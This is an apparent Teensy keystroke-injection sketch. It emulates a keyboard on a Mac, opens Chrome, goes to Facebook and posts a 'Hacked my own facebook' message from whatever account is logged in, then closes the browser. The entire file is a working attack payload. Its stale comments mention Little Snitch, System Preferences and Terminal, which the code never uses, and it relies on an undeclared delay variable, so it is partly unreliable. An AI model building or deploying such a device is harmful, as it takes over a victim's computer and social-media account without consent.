

#if defined(CORE_TEENSY)
#define LED_PIN 11
#else
#define LED_PIN 13
#endif

// Choose if you want to have the Teensy submit Little Snitch with the mouse, or the keyboard.
// Uncomment USE_MOUSE to use the mouse instead of the keyboard to submit Little Snitch.
// #define USE_MOUSE

void setup()
{
  // give us a little time to connect up
  delay(1000);

  // allow controlling LED
  pinMode(LED_PIN, OUTPUT);

  // turn the LED on while we're pwning
  digitalWrite(LED_PIN, HIGH);

  // open spotlight (or alfred/qs), then System Preferences<return>
  openapp("google chrome");
  delay(3000);
  // open new tab
  cmd(KEY_N);  
  delay(3000);
  Keyboard.print("www.facebook.com");

  k(KEY_ENTER);
  delay(10000);
  k(KEY_P);
  typeln("Hacked my own facebook - De Viniezzz");

  // Go to post button
  for (int i = 0; i < 6; i++)
  {
    k(KEY_TAB);
    delay(1);
  }

  k(KEY_ENTER);
  delay(1000);
  cmd(KEY_Q);

  // in case another window is running in terminal,
  // don't quit terminal in popup window by hitting ESC
  k(KEY_ESC);  

  // we're done!
}


// type a string (pressing enter at the end)
// we have extra delays so we can see what's happening
void typeln(String chars)
{
  Keyboard.print(chars);
  delay(ds);
  Keyboard.println("");
  delay(ds * 4);
}

// open an application on OS X via spotlight/alfred
void openapp(String app)
{
  // open spotlight (or alfred/qs), then the app
  cmd(KEY_SPACE);
  typeln(app);
}


void k(int key)
{
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(ds/2);

  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(ds/2);
}

void mod(int mod, int key)
{
  Keyboard.set_modifier(mod);
  Keyboard.send_now();
  delay(500);
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(ds);

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(ds);
}

void ctrl(int key)
{
  mod(MODIFIERKEY_CTRL, key);
}

void cmd(int key)
{
  mod(MODIFIERKEY_GUI, key);
}

void shift(int key)
{
  mod(MODIFIERKEY_SHIFT, key);
}

void loop()
{
  // blink quickly so we know we're done
  digitalWrite(LED_PIN, HIGH);
  delay(ds/2);
  digitalWrite(LED_PIN, LOW);
  delay(ds/2);
}


